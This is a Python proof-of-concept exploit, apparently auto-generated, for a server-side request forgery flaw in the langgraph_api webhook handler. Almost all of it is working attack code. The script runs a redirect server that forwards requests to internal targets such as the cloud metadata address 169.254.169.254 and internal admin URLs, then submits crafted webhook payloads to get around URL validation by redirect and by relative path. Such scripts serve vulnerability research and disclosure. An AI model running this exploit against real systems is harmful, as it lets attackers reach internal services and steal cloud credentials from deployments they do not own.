#!/usr/bin/env python3
# PoC for langgraph_api (/home/xcy/.local/lib/python3.14/site-packages/langgraph_api)
# Path: ssrf-005
# Sink: get_loopback_client
# Auto-generated — run with: python3 ssrf_url_controlled_stored_result_get_loopback_client.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF in langgraph_api webhook handling

Vulnerability Summary:
The webhook URL is user-controlled and validated via validate_webhook_url_or_raise,
but the HTTP client follows redirects (follow_redirects=True by default in httpx).
An attacker can provide a URL that passes initial validation but redirects to internal
IPs (e.g., 127.0.0.1, 169.254.169.254). Additionally, if the webhook starts with '/',
the loopback client uses base_url='http://api' (internal hostname), allowing SSRF to
internal services.

This PoC demonstrates both attack vectors:
1. Redirect-based SSRF: Provide a URL that redirects to internal metadata endpoint
2. Relative path SSRF: Provide a webhook starting with '/' to hit internal API service

Requirements: Python 3.6+, httpx (or requests for demonstration)
"""

import argparse
import sys
import json
import time
import urllib.request
import urllib.error
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread

# Configuration
TARGET_API = "http://localhost:8123"  # Default langgraph API endpoint
CALLBACK_HOST = "0.0.0.0"  # Listen on all interfaces for redirect server
CALLBACK_PORT = 9999
INTERNAL_TARGETS = [
    "http://127.0.0.1:8080/admin",
    "http://169.254.169.254/latest/meta-data/",
    "http://api/internal/secret",
    "http://localhost:5000/",
]

class RedirectHandler(BaseHTTPRequestHandler):
    """HTTP server that redirects to internal targets"""
    
    def do_GET(self):
        self.send_response(301)
        # Redirect to internal target based on path
        target_idx = int(self.path.strip("/").split("/")[0]) if self.path.strip("/").isdigit() else 0
        target = INTERNAL_TARGETS[target_idx % len(INTERNAL_TARGETS)]
        self.send_header("Location", target)
        self.end_headers()
        self.wfile.write(b"Redirecting...")
    
    def do_POST(self):
        # For POST requests, also redirect (some clients follow POST redirects)
        self.do_GET()
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

def start_redirect_server():
    """Start a simple HTTP server that redirects to internal targets"""
    server = HTTPServer((CALLBACK_HOST, CALLBACK_PORT), RedirectHandler)
    thread = Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] Redirect server started on {CALLBACK_HOST}:{CALLBACK_PORT}")
    return server

def exploit_redirect_ssrf(target_url, callback_url):
    """
    Attempt SSRF via redirect bypass.
    The webhook URL passes validation but redirects to internal IP.
    """
    print(f"\n[*] Attempting redirect-based SSRF")
    print(f"[*] Using callback URL: {callback_url}")
    
    # The webhook payload that will be sent to the API
    webhook_payload = {
        "webhook": callback_url,
        "run": {
            "run_id": "test-ssrf-redirect-001",
            "name": "SSRF Test"
        },
        "status": "completed",
        "checkpoint": None,
        "run_started_at": "2024-01-01T00:00:00",
        "run_ended_at": "2024-01-01T00:00:01",
        "exception": None
    }
    
    try:
        # Send the webhook trigger to the langgraph API
        req = urllib.request.Request(
            f"{target_url}/webhook/trigger",
            data=json.dumps(webhook_payload).encode(),
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        
        with urllib.request.urlopen(req, timeout=10) as response:
            result = json.loads(response.read().decode())
            print(f"[+] API Response: {json.dumps(result, indent=2)}")
            
            if "webhook_sent_at" in result:
                print("[!] Webhook was sent! Check if internal service was accessed.")
                print("[!] If the redirect worked, the internal target received the request.")
                return True
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error: {e.code} - {e.reason}")
        if e.code == 422:
            print("[*] Validation caught the URL (expected for some cases)")
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return False

def exploit_relative_path_ssrf(target_url):
    """
    Attempt SSRF via relative path webhook.
    If webhook starts with '/', it uses loopback client with base_url='http://api'
    """
    print(f"\n[*] Attempting relative path SSRF")
    print(f"[*] Using webhook path: /internal/endpoint")
    
    # Webhook starting with '/' will be sent to http://api/internal/endpoint
    webhook_payload = {
        "webhook": "/internal/endpoint",
        "run": {
            "run_id": "test-ssrf-relative-001",
            "name": "SSRF Test Relative"
        },
        "status": "completed",
        "checkpoint": None,
        "run_started_at": "2024-01-01T00:00:00",
        "run_ended_at": "2024-01-01T00:00:01",
        "exception": None
    }
    
    try:
        req = urllib.request.Request(
            f"{target_url}/webhook/trigger",
            data=json.dumps(webhook_payload).encode(),
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        
        with urllib.request.urlopen(req, timeout=10) as response:
            result = json.loads(response.read().decode())
            print(f"[+] API Response: {json.dumps(result, indent=2)}")
            
            if "webhook_sent_at" in result:
                print("[!] Webhook was sent to internal API service!")
                print("[!] The request went to http://api/internal/endpoint")
                return True
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error: {e.code} - {e.reason}")
        if e.code == 422:
            print("[*] Validation caught the URL (expected for some cases)")
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return False

def main():
    parser = argparse.ArgumentParser(description="SSRF PoC for langgraph_api webhook")
    parser.add_argument("--target", default=TARGET_API, help="Target langgraph API URL")
    parser.add_argument("--callback-host", default=CALLBACK_HOST, help="Callback server host")
    parser.add_argument("--callback-port", type=int, default=CALLBACK_PORT, help="Callback server port")
    parser.add_argument("--redirect-only", action="store_true", help="Only test redirect SSRF")
    parser.add_argument("--relative-only", action="store_true", help="Only test relative path SSRF")
    
    args = parser.parse_args()
    
    print("[*] langgraph_api Webhook SSRF Proof-of-Concept")
    print(f"[*] Target API: {args.target}")
    print(f"[*] Callback server: {args.callback_host}:{args.callback_port}")
    
    # Start redirect server if testing redirect SSRF
    redirect_server = None
    if not args.relative_only:
        redirect_server = start_redirect_server()
        time.sleep(0.5)  # Give server time to start
    
    success = False
    
    # Test 1: Redirect-based SSRF
    if not args.relative_only:
        callback_url = f"http://{args.callback_host}:{args.callback_port}/0"
        if exploit_redirect_ssrf(args.target, callback_url):
            success = True
    
    # Test 2: Relative path SSRF
    if not args.redirect_only:
        if exploit_relative_path_ssrf(args.target):
            success = True
    
    # Cleanup
    if redirect_server:
        redirect_server.shutdown()
    
    if success:
        print("\n[+] SSRF vulnerability confirmed!")
        print("[!] The webhook was sent to an internal target.")
        print("[!] This demonstrates that the validation can be bypassed.")
    else:
        print("\n[-] SSRF not confirmed (may need different target or the API is patched)")
        print("[*] Try with a different target or check if the API is running")
    
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main())
